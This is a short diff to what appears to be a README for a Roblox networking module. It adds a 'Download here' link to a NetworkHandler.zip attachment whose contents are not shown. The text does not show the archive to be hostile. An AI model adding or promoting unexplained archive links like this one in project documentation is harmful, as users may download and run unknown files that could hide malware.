@@ -190,4 +190,7 @@ end)
 
 ---
 
+## Download here
+[NetworkHandler.zip](https://github.com/user-attachments/files/26174214/NetworkHandler.zip)
+
 This module offers a robust, performant foundation for building scalable, event-driven multiplayer experiences on Roblox.
